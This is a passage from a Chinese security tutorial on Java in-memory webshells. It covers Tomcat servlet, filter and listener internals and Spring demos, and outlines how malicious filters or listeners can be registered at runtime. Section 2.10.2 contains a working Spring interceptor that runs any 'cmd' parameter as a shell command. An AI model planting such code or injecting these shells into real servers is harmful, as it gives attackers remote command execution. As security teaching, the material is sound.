{"posts":[{"title":"完全零基础从0到1掌握Java内存马","text":"本文目录： 一、前言 二、前置知识 2.1 Servlet容器与Engine、Host、Context和Wrapper 2.2 编写一个简单的servlet 2.3 从代码层面看servlet初始化与装载流程 2.3.1 servlet初始化流程分析 2.3.2 servlet装载流程分析 2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain 2.5 编写一个简单的Filter 2.6 从代码层面分析Filter运行的整体流程 2.7 Listener简单介绍 2.8 编写一个简单的Listener（ServletRequestListener） 2.9 从代码层面分析Listener运行的整体流程 2.10 简单的spring项目搭建 2.10.1 编写一个简单的Spring Controller 2.10.2 编写一个简单的Spring Interceptor 2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty） 2.11 Spring MVC介绍 2.11.1 Spring MVC九大组件 2.11.2 简单的源码分析 2.11.2.1 九大组件的初始化 2.11.2.2 url和Controller的关系的建立 2.11.2.3 Spring Interceptor引入与执行流程分析 2.12 Spring WebFlux介绍与代码调试分析 2.12.1 什么是Mono？ 2.12.2 什么是Flux？ 2.12.3 Spring WebFlux启动过程分析 2.12.4 Spring WebFlux请求处理过程分析 2.12.5 Spring WebFlux过滤器WebFilter运行过程分析 2.13 Tomcat Valve介绍与运行过程分析 2.13.1 Valve与Pipeline 2.13.2 编写一个简单Tomcat Valve的demo 2.13.3 Tomcat Valve打入内存马思路分析 2.14 Tomcat Upgrade介绍与打入内存马思路分析 2.14.1 编写一个简单的Tomcat Upgrade的demo 2.14.1.1 利用SpringBoot搭建 2.14.1.2 利用Tomcat搭建 2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析 2.15 Tomcat Executor内存马介绍与打入内存马思路分析 2.15.1 2.15.2 Tomcat Executor内存马介绍与代码调试分析 2.15.2.1 Endpoint五大组件 2.15.2.2 Endpoint分类 2.15.2.3 Executor相关代码分析 三、传统Web型内存马 3.1 Servlet内存马 3.1.1 简单的servlet内存马demo编写 3.1.2 servlet内存马demo代码分析 3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解 3.2 Filter内存马 3.2.1 简单的filter内存马demo编写 3.2.2 servlet内存马demo代码分析 3.2.3 tomcat6下filter内存马的编写 3.3 Listener内存马 3.3.1 简单的Listener内存马demo编写 3.3.2 Listener内存马demo代码分析 四、Spring MVC框架型内存马 4.1 Spring Controller型内存马 4.1.1 简单的Spring Controller型内存马demo编写 4.1.2 Spring Controller型内存马demo代码分析 4.2 Spring Interceptor型内存马 4.3 Spring WebFlux内存马 4.3.1 简单的Spring WebFlux内存马demo编写 4.3.2 Spring WebFlux内存马demo代码分析 五、中间件型内存马 5.1 Tomcat Valve型内存马 5.2 Tomcat Upgrade内存马 5.3 Tomcat Executor内存马 六、致谢 一、前言&ensp;&ensp;&ensp;&ensp;之前写的零基础学Fastjson的文章反响很不错，很多师傅在公众号后台和我的微信私聊我表示感谢，其实也没啥，大家都是零基础过来的。网上的文章多而杂，并且只有少部分文章是配图清楚、文字描述清晰的，很多时候新手学着学着可能就因为作者的某一个地方没有描述清楚而不知其所指，非常痛苦；亦或是文章面向对象不同，前置知识不扎实导致很多东西无法理解，这些痛点我都曾经历过。但是随着看过的代码逐渐增多，见识逐渐丰富，调试的次数越多，对各种问题的处理就会越得心应手。&ensp;&ensp;&ensp;&ensp;本文所讨论的Java内存马是Java安全中的一个不可或缺的板块，它内容丰富绮丽，研究起来让人着迷，沉沦其中流连忘返。我参考了su18师傅一年多以前发表在Goby社区的这篇文章（https://nosec.org/home/detail/5049.html）中给出的分类方式，把整个零基础掌握java内存马系列分成了以下几个部分：传统web型、spring系列框架型、中间件型、其他内存马（Websocket/Jsp/线程型/RMI）、Agent型内存马、实战内存马打入（Jetty/Weblogic/Shiro/Struts2/GlassFish/xxl-job…）和内存马。&ensp;&ensp;&ensp;&ensp;好了，让我们闲话少叙，就此开始。 二、前置知识本篇文章除特殊说明外，使用的是jdk1.8.0_202+ tomcat 9.0.85，后者下载地址为： https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip。 2.1 Servlet容器与Engine、Host、Context和Wrapper这部分我找了好久，终于在一大堆高深/垃圾的文章中邂逅了一篇写的还算简明扼要易于理解的文章。 原文地址：https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li 这里组合引用其原文，简单概括，就是： Tomcat设计了四种容器，分别是Engine、Host、Context和Wrapper，其关系如下： 这一点可以从Tomcat的配置文件server.xml中看出来。 此时，设想这样一个场景：我们此时要访问https://manage.xxx.com:8080/user/list，那tomcat是如何实现请求定位到具体的servlet的呢？为此tomcat设计了Mapper，其中保存了容器组件与访问路径的映射关系。 然后就开始四步走： 根据协议和端口号选定Service和Engine。 我们知道Tomcat的每个连接器都监听不同的端口，比如Tomcat默认的HTTP连接器监听8080端口、默认的AJP连接器监听8009端口。上面例子中的URL访问的是8080端口，因此这个请求会被HTTP连接器接收，而一个连接器是属于一个Service组件的，这样Service组件就确定了。我们还知道一个Service组件里除了有多个连接器，还有一个容器组件，具体来说就是一个Engine容器，因此Service确定了也就意味着Engine也确定了。 根据域名选定Host。 Service和Engine确定后，Mapper组件通过url中的域名去查找相应的Host容器，比如例子中的url访问的域名是manage.xxx.com，因此Mapper会找到Host1这个容器。 根据url路径找到Context组件。 Host确定以后，Mapper根据url的路径来匹配相应的Web应用的路径，比如例子中访问的是/user，因此找到了Context1这个Context容器。 根据url路径找到Wrapper（Servlet）。 Context确定后，Mapper再根据web.xml中配置的Servlet映射路径来找到具体的Wrapper和Servlet，例如这里的Wrapper1的/list。 这里的Context翻译过来就是上下文，它包括servlet运行的基本环境；这里的Wrapper翻译过来就是包装器，它负责管理一个servlet，包括其装载、初始化、执行和资源回收。 关于上图中的连接器的设计，可以继续参考该作者的博文： https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de 写到后面之后我又发现了一篇写的极佳的文章，贴在这儿供大家参考，讲的是关于tomcat架构的原理解析： https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09 2.2 编写一个简单的servletpom.xml文件如下： 12345678910111213141516171819202122232425&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;servletMemoryShell&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 同步下依赖： TestServlet.java代码如下： 1234567891011121314package org.example;import java.io.IOException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@WebServlet(&quot;/test&quot;)public class TestServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException { resp.getWriter().write(&quot;hello world&quot;); }} 然后配置项目运行所需的tomcat环境： 然后配置artifacts，直接点击fix： 然后添加web模块： 运行之后，访问http://localhost:8080/testServlet/test： 2.3 从代码层面看servlet初始化与装载流程主要参考文章： https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/ 我们这里不采用我们下载的tomcat来运行我们的项目，我们使用嵌入式tomcat也就是所谓的tomcat-embed-core。关于动态调试，我是图省事，直接用tomcat-embed-core，你当然也可以调试直接调试tomcat源码，环境搭建方法可以参考Skay师傅的文章： https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw 我们重开一个项目，文件代码如下： pom.xml： 1234567891011121314151617181920212223242526272829303132&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;servletMemoryShell&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt; &lt;version&gt;9.0.83&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt; &lt;version&gt;9.0.83&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; Main.java： 123456789101112131415161718package org.example;import org.apache.catalina.Context;import org.apache.catalina.LifecycleException;import org.apache.catalina.startup.Tomcat;import java.io.File;public class Main { public static void main(String[] args) throws LifecycleException { Tomcat tomcat = new Tomcat(); tomcat.getConnector(); //tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603 Context context = tomcat.addWebapp(&quot;&quot;, new File(&quot;.&quot;).getAbsolutePath()); Tomcat.addServlet(context, &quot;helloServlet&quot;, new HelloServlet()); context.addServletMappingDecoded(&quot;/hello&quot;, &quot;helloServlet&quot;); tomcat.start(); tomcat.getServer().await(); }} HelloServlet.java： 1234567891011121314151617181920package org.example;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;@WebServlet(&quot;/hello&quot;)public class HelloServlet extends HttpServlet { protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(&quot;text/html&quot;); PrintWriter out = response.getWriter(); out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;); out.println(&quot;Hello, World!&quot;); out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;); }} 2.3.1 servlet初始化流程分析我们在org.apache.catalina.core.StandardWrapper#setServletClass处下断点调试： 我们尝试按Ctrl+左键追踪它的上层调用位置，但是提示我们找不到，需要按两次Ctrl+Alt+F7： 然后就可以看到，上层调用位置位于org.apache.catalina.startup.ContextConfig#configureContext： 接下来我们详细看下面这段代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253for (ServletDef servlet : webxml.getServlets().values()) { Wrapper wrapper = context.createWrapper(); if (servlet.getLoadOnStartup() != null) { wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue()); } if (servlet.getEnabled() != null) { wrapper.setEnabled(servlet.getEnabled().booleanValue()); } wrapper.setName(servlet.getServletName()); Map&lt;String,String&gt; params = servlet.getParameterMap(); for (Entry&lt;String, String&gt; entry : params.entrySet()) { wrapper.addInitParameter(entry.getKey(), entry.getValue()); } wrapper.setRunAs(servlet.getRunAs()); Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs(); for (SecurityRoleRef roleRef : roleRefs) { wrapper.addSecurityReference( roleRef.getName(), roleRef.getLink()); } wrapper.setServletClass(servlet.getServletClass()); MultipartDef multipartdef = servlet.getMultipartDef(); if (multipartdef != null) { long maxFileSize = -1; long maxRequestSize = -1; int fileSizeThreshold = 0; if(null != multipartdef.getMaxFileSize()) { maxFileSize = Long.parseLong(multipartdef.getMaxFileSize()); } if(null != multipartdef.getMaxRequestSize()) { maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize()); } if(null != multipartdef.getFileSizeThreshold()) { fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold()); } wrapper.setMultipartConfigElement(new MultipartConfigElement( multipartdef.getLocation(), maxFileSize, maxRequestSize, fileSizeThreshold)); } if (servlet.getAsyncSupported() != null) { wrapper.setAsyncSupported( servlet.getAsyncSupported().booleanValue()); } wrapper.setOverridable(servlet.isOverridable()); context.addChild(wrapper); } for (Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) { context.addServletMappingDecoded(entry.getKey(), entry.getValue()); } 首先通过webxml.getServlets()获取的所有Servlet定义，并建立循环；然后创建一个Wrapper对象，并设置Servlet的加载顺序、是否启用（即获取&lt;/load-on-startup&gt;标签的值）、Servlet的名称等基本属性；接着遍历Servlet的初始化参数并设置到Wrapper中，并处理安全角色引用、将角色和对应链接添加到Wrapper中；如果Servlet定义中包含文件上传配置，则根据配置信息设置MultipartConfigElement；设置Servlet是否支持异步操作；通过context.addChild(wrapper);将配置好的Wrapper添加到Context中，完成Servlet的初始化过程。 上面大的for循环中嵌套的最后一个for循环则负责处理Servlet的url映射，将Servlet的url与Servlet名称关联起来。 也就是说，Servlet的初始化主要经历以下六个步骤： 创建Wapper对象； 设置Servlet的LoadOnStartUp的值； 设置Servlet的名称； 设置Servlet的class； 将配置好的Wrapper添加到Context中； 将url和servlet类做映射 2.3.2 servlet装载流程分析我们在org.apache.catalina.core.StandardWrapper#loadServlet这里打下断点进行调试，重点关注org.apache.catalina.core.StandardContext#startInternal： 可以看到，装载顺序为Listener–&gt;Filter–&gt;Servlet： 可以看到，上面红框中的代码都调用了org.apache.catalina.core.StandardContext#loadOnStartup，Ctrl+左键跟进该方法，代码如下： 123456789101112131415161718192021222324252627public boolean loadOnStartup(Container children[]) { TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;(); for (Container child : children) { Wrapper wrapper = (Wrapper) child; int loadOnStartup = wrapper.getLoadOnStartup(); if (loadOnStartup &lt; 0) { continue; } Integer key = Integer.valueOf(loadOnStartup); map.computeIfAbsent(key, k -&gt; new ArrayList&lt;&gt;()).add(wrapper); } for (ArrayList&lt;Wrapper&gt; list : map.values()) { for (Wrapper wrapper : list) { try { wrapper.load(); } catch (ServletException e) { getLogger().error( sm.getString(&quot;standardContext.loadOnStartup.loadException&quot;, getName(), wrapper.getName()), StandardWrapper.getRootCause(e)); if (getComputedFailCtxIfServletStartFails()) { return false; } } } } return true;} 可以看到，这段代码先是创建一个TreeMap，然后遍历传入的Container数组，将每个Servlet的loadOnStartup值作为键，将对应的Wrapper对象存储在相应的列表中；如果这个loadOnStartup值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个loadOnStartup的升序的顺序来加载。 2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain开头先明确一点，就是Filter容器是用于对请求和响应进行过滤和处理的，以下这张图是根据Skay师傅文章中的图片重制的： https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g 从上图可以看出，这个filter就是一个关卡，客户端的请求在经过filter之后才会到Servlet，那么如果我们动态创建一个filter并且将其放在最前面，我们的filter就会最先执行，当我们在filter中添加恶意代码，就可以实现命令执行，形成内存马。 这些名词其实很容易理解，首先，需要定义过滤器FilterDef，存放这些FilterDef的数组被称为FilterDefs，每个FilterDef定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及class等，这一点可以从org/apache/tomcat/util/descriptor/web/FilterDef.java的代码中看出来；然后是FilterDefs，它只是过滤器的抽象定义，而FilterConfigs则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；紧接着是FilterMaps，它是用于将FilterConfigs映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的FilterConfigs，从而确定要执行的过滤器链；而FilterChain是由多个FilterConfigs组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照FilterChain中的顺序依次执行每个过滤器，对请求进行过滤和处理。 2.5 编写一个简单的Filter我们继续用我们之前在2.2中搭建的环境，添加TestFilter.java： 12345678910111213141516171819202122package org.example;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import java.io.IOException;@WebFilter(&quot;/test&quot;)public class TestFilter implements Filter { public void init(FilterConfig filterConfig) { System.out.println(&quot;[*] Filter初始化创建&quot;); } public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { System.out.println(&quot;[*] Filter执行过滤操作&quot;); filterChain.doFilter(servletRequest, servletResponse); } public void destroy() { System.out.println(&quot;[*] Filter已销毁&quot;); }} 跑起来之后，控制台输出[*] Filter初始化创建，当我们访问/test路由的时候，控制台继续输出[*] Filter执行过滤操作，当我们结束tomcat的时候，会触发destroy方法，从而输出[*] Filter已销毁： 2.6 从代码层面分析Filter运行的整体流程我们在上面的demo中的doFilter函数这里下断点进行调试： 跟进org.apache.catalina.core.StandardWrapperValve#invoke： 1filterChain.doFilter(request.getRequest(), response.getResponse()); 继续跟进变量filterChain，找到定义处的代码： 1ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); 查看该方法（org.apache.catalina.core.ApplicationFilterFactory#createFilterChain）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) { if (servlet == null) { return null; } else { ApplicationFilterChain filterChain = null; if (request instanceof Request) { Request req = (Request)request; if (Globals.IS_SECURITY_ENABLED) { filterChain = new ApplicationFilterChain(); } else { filterChain = (ApplicationFilterChain)req.getFilterChain(); if (filterChain == null) { filterChain = new ApplicationFilterChain(); req.setFilterChain(filterChain); } } } else { filterChain = new ApplicationFilterChain(); } filterChain.setServlet(servlet); filterChain.setServletSupportsAsync(wrapper.isAsyncSupported()); StandardContext context = (StandardContext)wrapper.getParent(); FilterMap[] filterMaps = context.findFilterMaps(); if (filterMaps != null &amp;&amp; filterMaps.length != 0) { DispatcherType dispatcher = (DispatcherType)request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;); String requestPath = null; Object attribute = request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;); if (attribute != null) { requestPath = attribute.toString(); } String servletName = wrapper.getName(); FilterMap[] var10 = filterMaps; int var11 = filterMaps.length; int var12; FilterMap filterMap; ApplicationFilterConfig filterConfig; for(var12 = 0; var12 &lt; var11; ++var12) { filterMap = var10[var12]; if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) { filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName()); if (filterConfig != null) { filterChain.addFilter(filterConfig); } } } var10 = filterMaps; var11 = filterMaps.length; for(var12 = 0; var12 &lt; var11; ++var12) { filterMap = var10[var12]; if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) { filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName()); if (filterConfig != null) { filterChain.addFilter(filterConfig); } } } return filterChain; } else { return filterChain; } }} 我们在该方法和下面定义filterMaps那行下断点进行调试，可以看到，这段代码先是判断servlet是否为空，如果是就表示没有有效的servlet，无法创建过滤器链；然后根据传入的ServletRequest的类型来分类处理，如果是Request类型，并且启用了安全性，那么就创建一个新的ApplicationFilterChain，如果没启用，那么就尝试从请求中获取现有的过滤器链，如果不存在那么就创建一个新的；接着是设置过滤器链的Servlet和异步支持属性，这个没啥说的；关键点在于后面从Wrapper中获取父级上下文（StandardContext），然后获取该上下文中定义的过滤器映射数组（FilterMap）；最后遍历过滤器映射数组，根据请求的DispatcherType和请求路径匹配过滤器，并将匹配的过滤器添加到过滤器链中，最终返回创建或更新后的过滤器链。 从上面的两张图我们也可以清晰地看到filterConfig、filterMap、FilterDef的结构。 跟进刚才的filterChain.doFilter方法，位于org.apache.catalina.core.ApplicationFilterChain#doFilter： 可以看到都是调用了org.apache.catalina.core.ApplicationFilterChain#internalDoFilter方法，在这个方法中会依次拿到filterConfig和filter： 好了，大致过程到这里就结束了，但是我们的目的是打入内存马，也就是要动态地创建一个Filter，回顾之前的调试过程，我们发现在createFilterChain那个函数里面有两个关键点： 也就是这里我用箭头指出来的org.apache.catalina.core.StandardContext#findFilterMaps和org.apache.catalina.core.StandardContext#findFilterConfig。 二者的实现代码粘贴如下： 123456789public FilterMap[] findFilterMaps() { return filterMaps.asArray();}public FilterConfig findFilterConfig(String name) { synchronized (filterDefs) { return filterConfigs.get(name); }} 也就是说我们只需要查找到现有的上下文，然后往里面插入我们自定义的恶意过滤器映射和过滤器配置，就可以实现动态添加过滤器了。 那也就是说，我们现在的问题就转化为如何添加filterMap和filterConfig。我们搜索关键词addFilterMap，即可看到在StandardContext中有两个相关的方法： 注释里面也说的很清楚，addFilterMap是在一组映射末尾添加新的我们自定义的新映射；而addFilterMapBefore则会自动把我们创建的filterMap丢到第一位去，无需再手动排序，这正是我们需要的呀！ 可以看到，上面的addFilterMapBefore函数中第一步是先执行org.apache.catalina.core.StandardContext#validateFilterMap这个函数，点击去看看： 发现我们需要保证它在根据filterName找filterDef的时候，得能找到，也就是说，我们还得自定义filterDef并把它加入到filterDefs，不过这个也很简单，也有对应的方法，也就是org.apache.catalina.core.StandardContext#addFilterDef： 搞定，继续去看filterConfig如何添加。经过搜索发现，不存在类似上面的addFilterConfig这种方法： 但是有filterStart和filterStop这两个方法： 那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。 2.7 Listener简单介绍 由上图可知，Listener是最先被加载的，所以根据前面我们学到的思路，我动态注册一个恶意的Listener，就又可以形成一种内存马了。 在tomcat中，常见的Listener有以下几种： ServletContextListener，用来监听整个Web应用程序的启动和关闭事件，需要实现contextInitialized和contextDestroyed这两个方法； ServletRequestListener，用来监听HTTP请求的创建和销毁事件，需要实现requestInitialized和requestDestroyed这两个方法； HttpSessionListener，用来监听HTTP会话的创建和销毁事件，需要实现sessionCreated和sessionDestroyed这两个方法； HttpSessionAttributeListener，监听HTTP会话属性的添加、删除和替换事件，需要实现attributeAdded、attributeRemoved和attributeReplaced这三个方法。 很明显，ServletRequestListener是最适合做内存马的，因为它只要访问服务就能触发操作。 2.8 编写一个简单的Listener（ServletRequestListener）我们继续用我们之前在2.2中搭建的环境，替换掉之前的TestFilter.java，重新写一个TestListener.java： 1234567891011121314151617package org.example;import javax.servlet.*;import javax.servlet.annotation.WebListener;@WebListener(&quot;/test&quot;)public class TestListener implements ServletRequestListener { @Override public void requestDestroyed(ServletRequestEvent sre) { System.out.println(&quot;[+] destroy TestListener&quot;); } @Override public void requestInitialized(ServletRequestEvent sre) { System.out.println(&quot;[+] initial TestListener&quot;); }} 运行结果： 2.9 从代码层面分析Listener运行的整体流程我们在如图所示的两个地方下断点调试： 往下翻可以看到org.apache.catalina.core.StandardContext#listenerStart方法的调用： 代码写的通俗易懂，主要有两个事情要干，一是通过findApplicationListeners找到这些Listerner的名字；二是实例化这些listener： 接着就是分类摆放，我们需要的ServletRequestListener被放在了eventListeners里面： 分类摆放完了之后，干这样一件事情： 1eventListeners.addAll(Arrays.asList(getApplicationEventListeners())); Arrays.asList(...) 好理解，意思就是将数组转换为列表；eventListeners.addAll(...)也好理解，意思就是将括号里面的内容添加到之前实例化的监听器列表 eventListeners 中。关于括号里边的org.apache.catalina.core.StandardContext#getApplicationEventListeners这个方法，我们点进去看，代码如下： 1234@Overridepublic Object[] getApplicationEventListeners() { return applicationEventListenersList.toArray();} 也很简单明了，就是把applicationEventListenersList转换成一个包含任意类型对象的数组，也就是一个可能包含各种类型的应用程序事件监听器的数组。 那这总结起来就一句话，就是Listener有两个来源，一是根据web.xml文件或者@WebListener注解实例化得到的Listener；二是applicationEventListenersList中的Listener。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的addFilterConfig这种函数呢？当然是有的，ctrl+左键往上找： 方法名字叫做addApplicationEventListener，在StandardContext.java里面，代码如下，完美符合我们的需求，真是太哇塞了： 123public void addApplicationEventListener(Object listener) { applicationEventListenersList.add(listener);} 2.10 简单的spring项目搭建新建个项目，设置Server URL为https://start.aliyun.com/： 等待依赖解析完成： 这里给我们准备了一个示例，我们可以直接跑起来： 2.10.1 编写一个简单的Spring Controller1234567891011121314package org.example.springcontrollermemoryshellexample.demos.web;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class TestController { @ResponseBody @RequestMapping(&quot;/&quot;) public String test(){ return &quot;hello world&quot;; }} 非常地简单： 2.10.2 编写一个简单的Spring InterceptorTestInterceptor.java： 1234567891011121314151617181920212223242526272829303132package org.example.springcontrollermemoryshellexample.demos.web;import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class TestInterceptor extends HandlerInterceptorAdapter { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String cmd = request.getParameter(&quot;cmd&quot;); if(cmd != null){ try { java.io.PrintWriter writer = response.getWriter(); String output = &quot;&quot;; ProcessBuilder processBuilder; if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)){ processBuilder = new ProcessBuilder(&quot;cmd.exe&quot;, &quot;/c&quot;, cmd); }else{ processBuilder = new ProcessBuilder(&quot;/bin/sh&quot;, &quot;-c&quot;, cmd); } java.util.Scanner inputScanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;); output = inputScanner.hasNext() ? inputScanner.next(): output; inputScanner.close(); writer.write(output); writer.flush(); writer.close(); } catch (Exception ignored){} return false; } return true; }} WebConfig.java： 1234567891011121314package org.example.springcontrollermemoryshellexample.demos.web;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new TestInterceptor()).addPathPatterns(&quot;/**&quot;); }} Controller就是之前写的TestController.java，运行后访问http://127.0.0.1:8080/?cmd=whoami： 2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）我们先聊聊怎么自己写一个Spring WebFlux框架的demo。 这里我们新建一个SpringBoot项目，取名WebFluxMemoryShellDemo： 这里选择Spring Reactive Web： 接着新建两个文件，这里为了方便，我把这两个文件放到hello文件夹下。 GreetingHandler.java： 123456789101112131415package org.example.webfluxmemoryshelldemo.hello;import org.springframework.http.MediaType;import org.springframework.stereotype.Component;import org.springframework.web.reactive.function.BodyInserters;import org.springframework.web.reactive.function.server.ServerRequest;import org.springframework.web.reactive.function.server.ServerResponse;import reactor.core.publisher.Mono;@Componentpublic class GreetingHandler { public Mono&lt;ServerResponse&gt; hello(ServerRequest request) { return ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue(&quot;Hello, Spring!&quot;)); }} GreetingRouter.java： 1234567891011121314package org.example.webfluxmemoryshelldemo.hello;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.http.MediaType;import org.springframework.web.reactive.function.server.*;@Configurationpublic class GreetingRouter { @Bean public RouterFunction&lt;ServerResponse&gt; route(GreetingHandler greetingHandler) { return RouterFunctions.route(RequestPredicates.GET(&quot;/hello&quot;).and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello); }} 我们可以新建main/resources文件夹，然后新建application.properties，通过server.port来控制netty服务的端口： 接着我们运行： 这里我从github上找了一个项目，也可以很好地帮助我们理解这个框架是如何使用的，它采用的是Netty+SpringWebFlux： https://github.com/Java-Techie-jt/springboot-webflux-demo 随便访问个路由。例如http://127.0.0.1:9191/customers/stream： 2.11 Spring MVC介绍如果想要深入理解Spring MVC框架型内存马，那么对Spring MVC的基础了解是非常必要的，本节就从源码层面和大家简单聊聊这个框架。 首先引用《Spring in Action》上的一张图（这里我重制了一下）来了解Spring MVC的核心组件和大致处理流程（不过我在第五版书上貌似没有找到这张图，有找到的小伙伴可以公众号后台私信我）： 可以看到，这里有一堆名词，我们一一来看： DispatcherServlet是前端控制器，它负责接收Request并将Request转发给对应的处理组件； HandlerMapping负责完成url到Controller映射，可以通过它来找到对应的处理Request的Controller； Controller处理Request，并返回ModelAndVIew对象，ModelAndView是封装结果视图的组件； ④~⑦表示视图解析器解析ModelAndView对象并返回对应的视图给客户端。 还有一个概念需要了解，就是IOC容器，因为这个名词会在本文后面的内容中提及。 